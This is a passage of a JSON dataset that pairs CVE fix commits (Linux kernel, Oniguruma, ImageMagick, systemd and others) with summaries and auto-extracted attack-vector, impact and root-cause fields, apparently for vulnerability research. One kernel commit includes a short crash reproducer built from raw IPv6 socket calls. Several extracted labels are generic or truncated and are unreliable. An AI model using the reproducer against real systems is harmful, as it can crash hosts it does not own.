skb_copy_and_csum_bits ( skb_prev , maxfraglen , data + transhdrlen , fraggap , <number> ) ; is overwriting skb- > head and skb_shared_info since we apparently detect this rare condition too late , move the code earlier to even avoid allocating skb and risking crash","Vulnerability Type":"Improper Input Validation","Attack Vector":"via crafted system calls","Impact":"cause a denial of service ( system crash )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"b690371bbf97794b4a1d3f295d4fb9a8b05d402d","cve_id":"CVE-2017-9229","cwe_id":"CWE-476","commit_message":"fix #59 : access to invalid address by reg->dmax value","summary":"An issue was discovered in Oniguruma 6.2.0, as used in Oniguruma-mod in Ruby through 2.4.1 and mbstring in PHP through 7.1.5. A SIGSEGV occurs in left_adjust_char_head() during regular expression compilation. Invalid handling of reg->dmax in forward_search_range() could result in an invalid pointer dereference, normally as an immediate denial-of-service condition.","commit_message_1":"access to invalid address by reg- > dmax value","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By using a specially-crafted regular expression","Impact":"cause a denial of service","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"3b63d12038c8d8fc278e81c942fa9bec7c704c8b","cve_id":"CVE-2017-9228","cwe_id":"CWE-787","commit_message":"fix #60 : invalid state(CCS_VALUE) in parse_char_class()","summary":"An issue was discovered in Oniguruma 6.2.0, as used in Oniguruma-mod in Ruby through 2.4.1 and mbstring in PHP through 7.1.5. A heap out-of-bounds write occurs in bitset_set_range() during regular expression compilation due to an uninitialized variable from an incorrect state transition. An incorrect state transition in parse_char_class() could create an execution path that leaves a critical local variable uninitialized until it's used as an index, resulting in an out-of-bounds write memory corruption.","commit_message_1":"fix # <number> : invalid state ( ccs_value ) in parse_char_class ( )","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By using a specially-crafted regular expression","Impact":"overflow a buffer and execute arbitrary or cause the application to crash","Root Cause":"caused by improper bounds checking by bitset_set_range()","Attack Type":"remote attacker"},{"commit_id":"9690d3ab1f9bcd2db8cbe1fe3ee4a5da606b8814","cve_id":"CVE-2017-9227","cwe_id":"CWE-125","commit_message":"fix #58 : access to invalid address by reg->dmin value","summary":"An issue was discovered in Oniguruma 6.2.0, as used in Oniguruma-mod in Ruby through 2.4.1 and mbstring in PHP through 7.1.5. A stack out-of-bounds read occurs in mbc_enc_len() during regular expression searching. Invalid handling of reg->dmin in forward_search_range() could result in an invalid pointer dereference, as an out-of-bounds read from a stack buffer.","commit_message_1":"access to invalid address by reg- > dmin value","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"By using a specially-crafted regular expression","Impact":"overflow a buffer and execute arbitrary or cause the application to crash","Root Cause":"caused by improper bounds checking by mbc_enc_len()","Attack Type":"remote attacker"},{"commit_id":"b4bf968ad52afe14e60a2dc8a95d3555c543353a","cve_id":"CVE-2017-9226","cwe_id":"CWE-787","commit_message":"fix #55 : check too big code point value for single byte value in next_state_val()","summary":"An issue was discovered in Oniguruma 6.2.0, as used in Oniguruma-mod in Ruby through 2.4.1 and mbstring in PHP through 7.1.5. A heap out-of-bounds write or read occurs in next_state_val() during regular expression compilation. Octal numbers larger than 0xff are not handled correctly in fetch_token() and fetch_token_in_cc(). A malformed regular expression containing an octal number in the form of '700' would produce an invalid code point value larger than 0xff in next_state_val(), resulting in an out-of-bounds write memory corruption.","commit_message_1":"check too big code point value for single byte value in next_state_val ( )","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By using a specially-crafted regular expression","Impact":"overflow a buffer and execute arbitrary or cause the application to crash","Root Cause":"caused by improper bounds checking by next_state_val()","Attack Type":"remote attacker"},{"commit_id":"166a6c3999bf06b4de0ab4ce6b088a468cc4029f","cve_id":"CVE-2017-9225","cwe_id":"CWE-787","commit_message":"fix #56 : return invalid result for codepoint 0xFFFFFFFF","summary":"An issue was discovered in Oniguruma 6.2.0, as used in Oniguruma-mod in Ruby through 2.4.1 and mbstring in PHP through 7.1.5. A stack out-of-bounds write in onigenc_unicode_get_case_fold_codes_by_str() occurs during regular expression compilation. Code point 0xFFFFFFFF is not properly handled in unicode_unfold_key(). A malformed regular expression could result in 4 bytes being written off the end of a stack buffer of expand_case_fold_string() during the call to onigenc_unicode_get_case_fold_codes_by_str(), a typical stack buffer overflow.","commit_message_1":"fix # <number> : return invalid result for codepoint 0xffffffff","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By using a specially-crafted regular expression","Impact":"overflow a buffer and execute arbitrary or cause the application to crash","Root Cause":"caused by improper bounds checking by onigenc_unicode_get_case_fold_codes_by_str()","Attack Type":"remote attacker"},{"commit_id":"690313a061f7a4fa614ec5cc8368b4f2284e059b","cve_id":"CVE-2017-9224","cwe_id":"CWE-125","commit_message":"fix #57 : DATA_ENSURE() check must be before data access","summary":"An issue was discovered in Oniguruma 6.2.0, as used in Oniguruma-mod in Ruby through 2.4.1 and mbstring in PHP through 7.1.5. A stack out-of-bounds read occurs in match_at() during regular expression searching. A logical error involving order of validation and access in match_at() could result in an out-of-bounds read from a stack buffer.","commit_message_1":"data_ensure ( ) check must be before data access","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"A logical error involving order of validation and access in match_at()","Impact":"overflow a buffer and execute arbitrary or cause the application to crash","Root Cause":"caused by improper bounds checking by match_at()","Attack Type":"remote attacker"},{"commit_id":"a924f43f30f9c4acaf70618dd2a055f8b0f166be","cve_id":"CVE-2017-9217","cwe_id":"CWE-20","commit_message":"resolved: bugfix of null pointer p->question dereferencing (#6020)\n\nSee https:\/\/bugs.launchpad.net\/ubuntu\/+source\/systemd\/+bug\/1621396","summary":"systemd-resolved through 233 allows remote attackers to cause a denial of service (daemon crash) via a crafted DNS response with an empty question section.","commit_message_1":"bugfix of null pointer p- > question dereferencing ( # <number> ) see http : \/\/<file>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted dns response with an empty question section","Impact":"cause a denial of service ( daemon crash )","Root Cause":"systemd-resolved through 233","Attack Type":"remote attacker"},{"commit_id":"9933e113c2e87a9f46a40fde8dafbf801dca1ab9","cve_id":"CVE-2017-9211","cwe_id":"CWE-476","commit_message":"crypto: skcipher - Add missing API setkey checks\n\nThe API setkey checks for key sizes and alignment went AWOL during the\nskcipher conversion.  This patch restores them.\n\nCc: <stable@vger.kernel.org>\nFixes: 4e6c3df4d729 (\"crypto: skcipher - Add low-level skcipher...\")\nReported-by: Baozeng <sploving1@gmail.com>\nSigned-off-by: Herbert Xu <herbert@gondor.apana.org.au>","summary":"The crypto_skcipher_init_tfm function in crypto\/skcipher.c in the Linux kernel through 4.11.2 relies on a setkey function that lacks a key-size check, which allows local users to cause a denial of service (NULL pointer dereference) via a crafted application.","commit_message_1":"skcipher - add missing api setkey check the api setkey check for key size and alignment went awol during the skcipher conversion","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted application","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"b45cb1b665a14b0175b9cb1502ef7168e1fe0d5d","cve_id":"CVE-2017-9207","cwe_id":"CWE-125","commit_message":"Fixed invalid memory access bugs when decoding JPEG Exif data\n\nFixes issues #22, #23, #24, #25","summary":"The iw_get_ui16be function in imagew-util.c:422:24 in libimageworsener.a in ImageWorsener 1.3.1 allows remote attackers to cause a denial of service (heap-based buffer over-read) via a crafted image, related to imagew-jpeg.c.","commit_message_1":"fixed invalid memory access bug when decoding jpeg exif data","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted image , related to imagew - jpeg . c","Impact":"cause a denial of service ( heap - based buffer over - read )","Root Cause":"caused by a heap-based buffer over-read","Attack Type":"remote attacker"},{"commit_id":"a4f247707f08e322f0b41e82c3e06e224240a654","cve_id":"CVE-2017-9203","cwe_id":"CWE-787","commit_message":"Fixed a bug that could cause invalid memory to be accessed\n\nThe bug could happen when transparency is removed from an image.\nAlso fixed a semi-related BMP error handling logic bug.\nFixes issue #21","summary":"imagew-main.c:960:12 in libimageworsener.a in ImageWorsener 1.3.1 allows remote attackers to cause a denial of service (buffer underflow) via a crafted image, related to imagew-bmp.c.","commit_message_1":"fixed a bug that could cause invalid memory to be accessed the bug could happen when transparency is removed from an image","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"By persuading a victim to open a specially crafted image file","Impact":"cause a denial of service","Root Cause":"caused by buffer underflow","Attack Type":"remote attacker"},{"commit_id":"dc49c807926b96e503bd7c0dec35119eecd6c6fe","cve_id":"CVE-2017-9202","cwe_id":"CWE-369","commit_message":"Double-check that the input image's density is valid\n\nFixes a bug that could result in division by zero, at least for a JPEG\nsource image.\nFixes issues #19, #20","summary":"imagew-cmd.c:854:45 in libimageworsener.a in ImageWorsener 1.3.1 allows remote attackers to cause a denial of service (divide-by-zero error) via a crafted image, related to imagew-api.c.","commit_message_1":"double-check that the input image 's density is valid fix a bug that could result in division by zero , at least for a jpeg source image","Vulnerability Type":"Divide By Zero","Attack Vector":"via a crafted image , related to imagew - api . c","Impact":"cause a denial of service ( divide - by - zero error )","Root Cause":"caused by divide-by-zero error","Attack Type":"remote attacker"},{"commit_id":"0d0e57697f162da4aa218b5feafe614fb666db07","cve_id":"CVE-2017-9150","cwe_id":"CWE-200","commit_message":"bpf: don't let ldimm64 leak map addresses on unprivileged\n\nThe patch fixes two things at once:\n\n1) It checks the env->allow_ptr_leaks and only prints the map address to\n   the log if we have the privileges to do so, otherwise it just dumps 0\n   as we would when kptr_restrict is enabled on %pK. Given the latter is\n   off by default and not every distro sets it, I don't want to rely on\n   this, hence the 0 by default for unprivileged.\n\n2) Printing of ldimm64 in the verifier log is currently broken in that\n   we don't print the full immediate, but only the 32 bit part of the\n   first insn part for ldimm64. Thus, fix this up as well; it's okay to\n   access, since we verified all ldimm64 earlier already (including just\n   constants) through replace_map_fd_with_map_ptr().\n\nFixes: 1be7f75d1668 (\"bpf: enable non-root eBPF programs\")\nFixes: cbd357008604 (\"bpf: verifier (add ability to receive verification log)\")\nReported-by: Jann Horn <jannh@google.com>\nSigned-off-by: Daniel Borkmann <daniel@iogearbox.net>\nAcked-by: Alexei Starovoitov <ast@kernel.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The do_check function in kernel\/bpf\/verifier.c in the Linux kernel before 4.11.1 does not make the allow_ptr_leaks value available for restricting the output of the print_bpf_insn function, which allows local users to obtain sensitive address information via crafted bpf system calls.","commit_message_1":"do n't let ldimm64 leak map address on unprivileged the patch fix two thing at once : <number> ) it check the env- > allow_ptr_leaks and only print the map address to the log if we have the privilege to do so , otherwise it just dump <number> a we would when kptr_restrict is enabled on % pk","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via crafted bpf system calls","Impact":"obtain sensitive address information","Root Cause":"does not make the allow _ ptr _ leaks value available for restricting the output of the print _ bpf _ insn function","Attack Type":"local attacker"},{"commit_id":"7fdf9ea808caa3c81a0eb42656e5fafc59084198","cve_id":"CVE-2017-9144","cwe_id":"CWE-20","commit_message":"Check for EOF conditions for RLE image format","summary":"In ImageMagick 7.0.5-5, a crafted RLE image can trigger a crash because of incorrect EOF handling in coders\/rle.c.","commit_message_1":"check for eof condition for rle image format","Vulnerability Type":"Improper Input Validation","Attack Vector":"By persuading a victim to open a specially-crafted RLE image","Impact":"cause a denial of service","Root Cause":"caused by the improper handling of EOF","Attack Type":"remote attacker"},{"commit_id":"7b8c1df65b25d6671f113e2306982eded44ce3b4","cve_id":"CVE-2017-9143","cwe_id":"CWE-772","commit_message":"Fixed memory leak reported in #456.","summary":"In ImageMagick 7.0.5-5, the ReadARTImage function in coders\/art.c allows attackers to cause a denial of service (memory leak) via a crafted .art file.","commit_message_1":"fixed memory leak reported in # <number>","Vulnerability Type":"memory leak","Attack Vector":"By persuading a victim to open a specially-crafted .art file","Impact":"cause a denial of service","Root Cause":"caused by a memory leak","Attack Type":"attacker"},{"commit_id":"72f5c8632bff2daf3c95005f9b4cf2982786b52a","cve_id":"CVE-2017-9142","cwe_id":"CWE-20","commit_message":"Fixed incorrect call to WriteBlob reported in #490.","summary":"In ImageMagick 7.0.5-7 Q16, a crafted file could trigger an assertion failure in the WriteBlob function in MagickCore\/blob.c because of missing checks in the ReadOneJNGImage function in coders\/png.c.","commit_message_1":"fixed incorrect call to writeblob reported in # <number>","Vulnerability Type":"Improper Input Validation","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"f5910e91b0778e03ded45b9022be8eb8f77942cd","cve_id":"CVE-2017-9141","cwe_id":"CWE-20","commit_message":"Added check to prevent image being 0x0 (reported in #489).","summary":"In ImageMagick 7.0.5-7 Q16, a crafted file could trigger an assertion failure in the ResetImageProfileIterator function in MagickCore\/profile.c because of missing checks in the ReadDDSImage function in coders\/dds.c.","commit_message_1":"added check to prevent image being 0x0 ( reported in # <number> )","Vulnerability Type":"Improper Input Validation","Attack Vector":"By persuading a victim to open a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"1c358ffe0049f768dd49a8a889c1cbf99ac9849b","cve_id":"CVE-2017-9098","cwe_id":"CWE-200","commit_message":"Reset memory for RLE decoder (patch provided by scarybeasts)","summary":"ImageMagick before 7.0.5-2 and GraphicsMagick before 1.3.24 use uninitialized memory in the RLE decoder, allowing an attacker to leak sensitive information from process memory space, as demonstrated by remote attacks against ImageMagick code in a long-running server process that converts image data on behalf of multiple users. This is caused by a missing initialization step in the ReadRLEImage function in coders\/rle.c.","commit_message_1":"reset memory for rle decoder ( patch provided by scarybeasts )","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"by remote attacks against ImageMagick code in a long-running server process that converts image data on behalf of multiple users","Impact":"leak sensitive information from process memory space ","Root Cause":"use uninitialized memory","Attack Type":"remote attacker"},{"commit_id":"83eaddab4378db256d00d295bda6ca997cd13a52","cve_id":"CVE-2017-9077","cwe_id":null,"commit_message":"ipv6\/dccp: do not inherit ipv6_mc_list from parent\n\nLike commit 657831ffc38e (\"dccp\/tcp: do not inherit mc_list from parent\")\nwe should clear ipv6_mc_list etc. for IPv6 sockets too.\n\nCc: Eric Dumazet <edumazet@google.com>\nSigned-off-by: Cong Wang <xiyou.wangcong@gmail.com>\nAcked-by: Eric Dumazet <edumazet@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The tcp_v6_syn_recv_sock function in net\/ipv6\/tcp_ipv6.c in the Linux kernel through 4.11.1 mishandles inheritance, which allows local users to cause a denial of service or possibly have unspecified other impact via crafted system calls, a related issue to CVE-2017-8890.","commit_message_1":"do not inherit ipv6_mc_list from parent like commit 657831ffc38e ( `` dccp\/tcp : do not inherit mc_list from parent '' ) we should clear ipv6_mc_list etc","Vulnerability Type":"unspecified","Attack Vector":"via crafted system calls , a related issue to cve - 2017 - 8890","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"fdcee2cbb8438702ea1b328fb6e0ac5e9a40c7f8","cve_id":"CVE-2017-9075","cwe_id":null,"commit_message":"sctp: do not inherit ipv6_{mc|ac|fl}_list from parent\n\nSCTP needs fixes similar to 83eaddab4378 (\"ipv6\/dccp: do not inherit\nipv6_mc_list from parent\"), otherwise bad things can happen.\n\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nTested-by: Andrey Konovalov <andreyknvl@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The sctp_v6_create_accept_sk function in net\/sctp\/ipv6.c in the Linux kernel through 4.11.1 mishandles inheritance, which allows local users to cause a denial of service or possibly have unspecified other impact via crafted system calls, a related issue to CVE-2017-8890.","commit_message_1":"do not inherit ipv6_ { mc|ac|fl } _list from parent sctp need fix similar to 83eaddab4378 ( `` ipv6\/dccp : do not inherit ipv6_mc_list from parent '' ) , otherwise bad thing can happen","Vulnerability Type":"unspecified","Attack Vector":"via crafted system calls , a related issue to cve - 2017 - 8890","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"2423496af35d94a87156b063ea5cedffc10a70a1","cve_id":"CVE-2017-9074","cwe_id":"CWE-125","commit_message":"ipv6: Prevent overrun when parsing v6 header options\n\nThe KASAN warning repoted below was discovered with a syzkaller\nprogram.  The reproducer is basically:\n  int s = socket(AF_INET6, SOCK_RAW, NEXTHDR_HOP);\n  send(s, &one_byte_of_data, 1, MSG_MORE);\n  send(s, &more_than_mtu_bytes_data, 2000, 0);\n\nThe socket() call sets the nexthdr field of the v6 header to\nNEXTHDR_HOP, the first send call primes the payload with a non zero\nbyte of data, and the second send call triggers the fragmentation path.\n\nThe fragmentation code tries to parse the header options in order\nto figure out where to insert the fragment option.  Since nexthdr points\nto an invalid option, the calculation of the size of the network header\ncan made to be much larger than the linear section of the skb and data\nis read outside of it.\n\nThis fix makes ip6_find_1stfrag return an error if it detects\nrunning out-of-bounds.\n\n[   42.361487] ==================================================================\n[   42.364412] BUG: KASAN: slab-out-of-bounds in ip6_fragment+0x11c8\/0x3730\n[   42.365471] Read of size 840 at addr ffff88000969e798 by task ip6_fragment-oo\/3789\n[   42.366469]\n[   42.366696] CPU: 1 PID: 3789 Comm: ip6_fragment-oo Not tainted 4.11.0+ #41\n[   42.367628] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.1-1ubuntu1 04\/01\/2014\n[   42.368824] Call Trace:\n[   42.369183]  dump_stack+0xb3\/0x10b\n[   42.369664]  print_address_description+0x73\/0x290\n[   42.370325]  kasan_report+0x252\/0x370\n[   42.370839]  ? ip6_fragment+0x11c8\/0x3730\n[   42.371396]  check_memory_region+0x13c\/0x1a0\n[   42.371978]  memcpy+0x23\/0x50\n[   42.372395]  ip6_fragment+0x11c8\/0x3730\n[   42.372920]  ? nf_ct_expect_unregister_notifier+0x110\/0x110\n[   42.373681]  ? ip6_copy_metadata+0x7f0\/0x7f0\n[   42.374263]  ? ip6_forward+0x2e30\/0x2e30\n[   42.374803]  ip6_finish_output+0x584\/0x990\n[   42.375350]  ip6_output+0x1b7\/0x690\n[   42.375836]  ? ip6_finish_output+0x990\/0x990\n[   42.376411]  ? ip6_fragment+0x3730\/0x3730\n[   42.376968]  ip6_local_out+0x95\/0x160\n[   42.377471]  ip6_send_skb+0xa1\/0x330\n[   42.377969]  ip6_push_pending_frames+0xb3\/0xe0\n[   42.378589]  rawv6_sendmsg+0x2051\/0x2db0\n[   42.379129]  ? rawv6_bind+0x8b0\/0x8b0\n[   42.379633]  ? _copy_from_user+0x84\/0xe0\n[   42.380193]  ? debug_check_no_locks_freed+0x290\/0x290\n[   42.380878]  ? ___sys_sendmsg+0x162\/0x930\n[   42.381427]  ? rcu_read_lock_sched_held+0xa3\/0x120\n[   42.382074]  ? sock_has_perm+0x1f6\/0x290\n[   42.382614]  ? ___sys_sendmsg+0x167\/0x930\n[   42.383173]  ? lock_downgrade+0x660\/0x660\n[   42.383727]  inet_sendmsg+0x123\/0x500\n[   42.384226]  ? inet_sendmsg+0x123\/0x500\n[   42.384748]  ? inet_recvmsg+0x540\/0x540\n[   42.385263]  sock_sendmsg+0xca\/0x110\n[   42.385758]  SYSC_sendto+0x217\/0x380\n[   42.386249]  ? SYSC_connect+0x310\/0x310\n[   42.386783]  ? __might_fault+0x110\/0x1d0\n[   42.387324]  ? lock_downgrade+0x660\/0x660\n[   42.387880]  ? __fget_light+0xa1\/0x1f0\n[   42.388403]  ? __fdget+0x18\/0x20\n[   42.388851]  ? sock_common_setsockopt+0x95\/0xd0\n[   42.389472]  ? SyS_setsockopt+0x17f\/0x260\n[   42.390021]  ? entry_SYSCALL_64_fastpath+0x5\/0xbe\n[   42.390650]  SyS_sendto+0x40\/0x50\n[   42.391103]  entry_SYSCALL_64_fastpath+0x1f\/0xbe\n[   42.391731] RIP: 0033:0x7fbbb711e383\n[   42.392217] RSP: 002b:00007ffff4d34f28 EFLAGS: 00000246 ORIG_RAX: 000000000000002c\n[   42.393235] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007fbbb711e383\n[   42.394195] RDX: 0000000000001000 RSI: 00007ffff4d34f60 RDI: 0000000000000003\n[   42.395145] RBP: 0000000000000046 R08: 00007ffff4d34f40 R09: 0000000000000018\n[   42.396056] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000400aad\n[   42.396598] R13: 0000000000000066 R14: 00007ffff4d34ee0 R15: 00007fbbb717af00\n[   42.397257]\n[   42.397411] Allocated by task 3789:\n[   42.397702]  save_stack_trace+0x16\/0x20\n[   42.398005]  save_stack+0x46\/0xd0\n[   42.398267]  kasan_kmalloc+0xad\/0xe0\n[   42.398548]  kasan_slab_alloc+0x12\/0x20\n[   42.398848]  __kmalloc_node_track_caller+0xcb\/0x380\n[   42.399224]  __kmalloc_reserve.isra.32+0x41\/0xe0\n[   42.399654]  __alloc_skb+0xf8\/0x580\n[   42.400003]  sock_wmalloc+0xab\/0xf0\n[   42.400346]  __ip6_append_data.isra.41+0x2472\/0x33d0\n[   42.400813]  ip6_append_data+0x1a8\/0x2f0\n[   42.401122]  rawv6_sendmsg+0x11ee\/0x2db0\n[   42.401505]  inet_sendmsg+0x123\/0x500\n[   42.401860]  sock_sendmsg+0xca\/0x110\n[   42.402209]  ___sys_sendmsg+0x7cb\/0x930\n[   42.402582]  __sys_sendmsg+0xd9\/0x190\n[   42.402941]  SyS_sendmsg+0x2d\/0x50\n[   42.403273]  entry_SYSCALL_64_fastpath+0x1f\/0xbe\n[   42.403718]\n[   42.403871] Freed by task 1794:\n[   42.404146]  save_stack_trace+0x16\/0x20\n[   42.404515]  save_stack+0x46\/0xd0\n[   42.404827]  kasan_slab_free+0x72\/0xc0\n[   42.405167]  kfree+0xe8\/0x2b0\n[   42.405462]  skb_free_head+0x74\/0xb0\n[   42.405806]  skb_release_data+0x30e\/0x3a0\n[   42.406198]  skb_release_all+0x4a\/0x60\n[   42.406563]  consume_skb+0x113\/0x2e0\n[   42.406910]  skb_free_datagram+0x1a\/0xe0\n[   42.407288]  netlink_recvmsg+0x60d\/0xe40\n[   42.407667]  sock_recvmsg+0xd7\/0x110\n[   42.408022]  ___sys_recvmsg+0x25c\/0x580\n[   42.408395]  __sys_recvmsg+0xd6\/0x190\n[   42.408753]  SyS_recvmsg+0x2d\/0x50\n[   42.409086]  entry_SYSCALL_64_fastpath+0x1f\/0xbe\n[   42.409513]\n[   42.409665] The buggy address belongs to the object at ffff88000969e780\n[   42.409665]  which belongs to the cache kmalloc-512 of size 512\n[   42.410846] The buggy address is located 24 bytes inside of\n[   42.410846]  512-byte region [ffff88000969e780, ffff88000969e980)\n[   42.411941] The buggy address belongs to the page:\n[   42.412405] page:ffffea000025a780 count:1 mapcount:0 mapping:          (null) index:0x0 compound_mapcount: 0\n[   42.413298] flags: 0x100000000008100(slab|head)\n[   42.413729] raw: 0100000000008100 0000000000000000 0000000000000000 00000001800c000c\n[   42.414387] raw: ffffea00002a9500 0000000900000007 ffff88000c401280 0000000000000000\n[   42.415074] page dumped because: kasan: bad access detected\n[   42.415604]\n[   42.415757] Memory state around the buggy address:\n[   42.416222]  ffff88000969e880: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n[   42.416904]  ffff88000969e900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n[   42.417591] >ffff88000969e980: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n[   42.418273]                    ^\n[   42.418588]  ffff88000969ea00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n[   42.419273]  ffff88000969ea80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n[   42.419882] ==================================================================\n\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nSigned-off-by: Craig Gallek <kraig@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The IPv6 fragmentation implementation in the Linux kernel through 4.11.1 does not consider that the nexthdr field may be associated with an invalid option, which allows local users to cause a denial of service (out-of-bounds read and BUG) or possibly have unspecified other impact via crafted socket and send system calls.","commit_message_1":"prevent overrun when parsing v6 header option the kasan warning repoted below wa discovered with a syzkaller program","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via crafted socket and send system calls","Impact":"cause a denial of service ( out - of - bounds read and bug ) or possibly have unspecified other impact","Root Cause":"does not consider that the nexthdr field may be associated with an invalid option ,","Attack Type":"local attacker"},{"commit_id":"c70422f760c120480fee4de6c38804c72aa26bc1","cve_id":"CVE-2017-9059","cwe_id":"CWE-404","commit_message":"Merge tag 'nfsd-4.12' of git:\/\/linux-nfs.org\/~bfields\/linux\n\nPull nfsd updates from Bruce Fields:\n \"Another RDMA update from Chuck Lever, and a bunch of miscellaneous\n  bugfixes\"\n\n* tag 'nfsd-4.12' of git:\/\/linux-nfs.org\/~bfields\/linux: (26 commits)\n  nfsd: Fix up the \"supattr_exclcreat\" attributes\n  nfsd: encoders mustn't use unitialized values in error cases\n  nfsd: fix undefined behavior in nfsd4_layout_verify\n  lockd: fix lockd shutdown race\n  NFSv4: Fix callback server shutdown\n  SUNRPC: Refactor svc_set_num_threads()\n  NFSv4.x\/callback: Create the callback service through svc_create_pooled\n  lockd: remove redundant check on block\n  svcrdma: Clean out old XDR encoders\n  svcrdma: Remove the req_map cache\n  svcrdma: Remove unused RDMA Write completion handler\n  svcrdma: Reduce size of sge array in struct svc_rdma_op_ctxt\n  svcrdma: Clean up RPC-over-RDMA backchannel reply processing\n  svcrdma: Report Write\/Reply chunk overruns\n  svcrdma: Clean up RDMA_ERROR path\n  svcrdma: Use rdma_rw API in RPC reply path\n  svcrdma: Introduce local rdma_rw API helpers\n  svcrdma: Clean up svc_rdma_get_inv_rkey()\n  svcrdma: Add helper to save pages under I\/O\n  svcrdma: Eliminate RPCRDMA_SQ_DEPTH_MULT\n  ...","summary":"The NFSv4 implementation in the Linux kernel through 4.11.1 allows local users to cause a denial of service (resource consumption) by leveraging improper channel callback shutdown when unmounting an NFSv4 filesystem, aka a *module reference and kernel daemon* leak.","commit_message_1":"pull nfsd update from bruce field : `` another rdma update from chuck lever , and a bunch of miscellaneous bugfixes '' * tag 'nfsd-<file> ' of git : \/\/linux-<file>\/~bfields\/linux : ( <number> commits ) nfsd : fix up the `` supattr_exclcreat '' attribute nfsd : encoders must n't use unitialized value in error case nfsd : fix undefined behavior in nfsd4_layout_verify lockd : fix lockd shutdown race nfsv4 : fix callback server shutdown sunrpc : refactor svc_set_num_threads ( ) <file>\/callback : create the callback service through svc_create_pooled lockd : remove redundant check on block svcrdma : clean out old xdr encoders svcrdma : remove the req_map cache svcrdma : remove unused rdma write completion handler svcrdma : reduce size of sge array in struct svc_rdma_op_ctxt svcrdma : clean up rpc-over-rdma backchannel reply processing svcrdma : report write\/reply chunk overrun svcrdma : clean up rdma_error path svcrdma : use rdma_rw api in rpc reply path svcrdma : introduce local rdma_rw api helper svcrdma : clean up svc_rdma_get_inv_rkey ( ) svcrdma : add helper to save page under i\/o svcrdma : eliminate rpcrdma_sq_depth_mult","Vulnerability Type":"Improper Resource Shutdown or Release","Attack Vector":"by leveraging improper channel callback shutdown when unmounting an nfsv4 filesystem , aka a * module reference and kernel daemon * leak","Impact":"cause a denial of service ( resource consumption )","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"fe6eea99efac66839052af547426518efd970b24","cve_id":"CVE-2017-9051","cwe_id":"CWE-476","commit_message":"nsvdec: don't ignore the return value of av_get_packet()\n\nFixes invalid reads with corrupted files.\n\nCC: libav-stable@libav.org\nBug-Id: 1039","summary":"libav before 12.1 is vulnerable to an invalid read of size 1 due to NULL pointer dereferencing in the nsv_read_chunk function in libavformat\/nsvdec.c.","commit_message_1":"do n't ignore the return value of av_get_packet ( ) fix invalid read with corrupted file","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"By using a specially-crafted file","Impact":"cause a denial of service","Root Cause":"caused by a NULL pointer dereference","Attack Type":"attacker"},{"commit_id":"053e67e3ec81cc9268ce30eaf0d6663d8639ed1e","cve_id":"CVE-2017-8929","cwe_id":"CWE-416","commit_message":"Fix issue #658","summary":"The sized_string_cmp function in libyara\/sizedstr.c in YARA 3.5.0 allows remote attackers to cause a denial of service (use-after-free and application crash) via a crafted rule.","commit_message_1":"fix issue # <number>","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted rule","Impact":"cause a denial of service ( use - after - free and application crash )","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"30572418b445d85fcfe6c8fe84c947d2606767d8","cve_id":"CVE-2017-8925","cwe_id":"CWE-404","commit_message":"USB: serial: omninet: fix reference leaks at open\n\nThis driver needlessly took another reference to the tty on open, a\nreference which was then never released on close. This lead to not just\na leak of the tty, but also a driver reference leak that prevented the\ndriver from being unloaded after a port had once been opened.\n\nFixes: 4a90f09b20f4 (\"tty: usb-serial krefs\")\nCc: stable <stable@vger.kernel.org>\t# 2.6.28\nSigned-off-by: Johan Hovold <johan@kernel.org>","summary":"The omninet_open function in drivers\/usb\/serial\/omninet.c in the Linux kernel before 4.10.4 allows local users to cause a denial of service (tty exhaustion) by leveraging reference count mishandling.","commit_message_1":"serial : omninet : fix reference leak at open this driver needlessly took another reference to the tty on open , a reference which wa then never released on close","Vulnerability Type":"Improper Resource Shutdown or Release","Attack Vector":"by leveraging reference count mishandling","Impact":"cause a denial of service ( tty exhaustion )","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"654b404f2a222f918af9b0cd18ad469d0c941a8e","cve_id":"CVE-2017-8924","cwe_id":"CWE-191","commit_message":"USB: serial: 